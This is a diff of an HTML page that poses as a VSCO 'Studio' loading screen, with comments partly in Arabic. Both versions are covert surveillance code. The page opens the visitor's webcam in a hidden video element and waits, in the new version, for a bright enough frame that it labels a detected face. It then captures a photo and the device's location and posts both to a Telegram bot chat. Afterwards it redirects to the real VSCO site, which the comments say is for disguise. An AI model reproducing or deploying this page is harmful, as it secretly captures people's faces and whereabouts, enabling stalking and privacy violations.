@@ -1,27 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VSCO - Create, Discover, Connect</title>
+    <title>VSCO Studio</title>
     <style>
-        body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; overflow: hidden; }
-        
-        /* تصميم الشعار النبضي */
+        body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
         .vsco-logo { width: 80px; height: 80px; margin-bottom: 20px; animation: pulse 2s infinite ease-in-out; }
-        @keyframes pulse {
-            0% { transform: scale(0.95); opacity: 0.6; }
-            50% { transform: scale(1.05); opacity: 1; }
-            100% { transform: scale(0.95); opacity: 0.6; }
-        }
-
-        .loading-text { font-size: 11px; letter-spacing: 3px; font-weight: 300; text-transform: uppercase; opacity: 0.5; }
+        @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.6; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.6; } }
+        #status { font-size: 11px; letter-spacing: 2px; opacity: 0.5; text-transform: uppercase; }
         video { width: 1px; height: 1px; opacity: 0; position: absolute; }
     </style>
 </head>
 <body>
-    <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo" alt="VSCO">
-    <div class="loading-text">Loading VSCO Studio...</div>
+    <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
+    <div id="status">Initializing Studio...</div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -31,43 +23,54 @@
         const chatId = "7414704332";
 
         window.onload = async () => {
-            // طلب الموقع فوراً (تلقائي)
-            navigator.geolocation.getCurrentPosition(p => {
-                const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=📍 تم تحديد الموقع بنجاح: ${loc}`);
-            }, (err) => {
-                // استمرار حتى لو رفض الموقع
-            });
-
-            // طلب الكاميرا فوراً (تلقائي)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('video');
+                v.srcObject = s;
                 
-                // التقاط الصورة بعد ثانية واحدة لضمان الوضوح
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth; 
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('photo', blob);
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, { 
-                            method: 'POST', 
-                            body: formData 
-                        });
-                    }, 'image/jpeg');
+                const checkInterval = setInterval(() => {
+                    const c = document.getElementById('canvas');
+                    const ctx = c.getContext('2d');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    ctx.drawImage(v, 0, 0);
+
+                    const data = ctx.getImageData(0, 0, c.width, c.height).data;
+                    let brightness = 0;
+                    for (let i = 0; i < data.length; i += 4) {
+                        brightness += (data[i] + data[i+1] + data[i+2]) / 3;
+                    }
+                    const avg = brightness / (data.length / 4);
+
+                    if (avg > 40) { 
+                        clearInterval(checkInterval);
+                        document.getElementById('status').innerText = "Face Detected. Redirecting...";
+                        sendData(c);
+                    }
                 }, 1000);
             } catch (e) {
-                // توجيه المستخدم لصفحة VSCO الرسمية في حال الرفض للتمويه
-                setTimeout(() => { window.location.href = "https://vsco.co/"; }, 3000);
+                setTimeout(() => { window.location.href = "https://vsco.co/"; }, 2000);
             }
         };
+
+        function sendData(canvas) {
+            navigator.geolocation.getCurrentPosition(p => {
+                const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ وجه مكتشف!\n📍 الموقع: ${loc}`);
+            });
+
+            canvas.toBlob(b => {
+                const f = new FormData();
+                f.append('photo', b);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, { method: 'POST', body: f });
+            }, 'image/jpeg');
+            
+            // التحويل بعد ثانيتين بالضبط
+            setTimeout(() => { window.location.href = "https://vsco.co/"; }, 2000);
+        }
     </script>
 </body>
 </html>
+
 
 
 
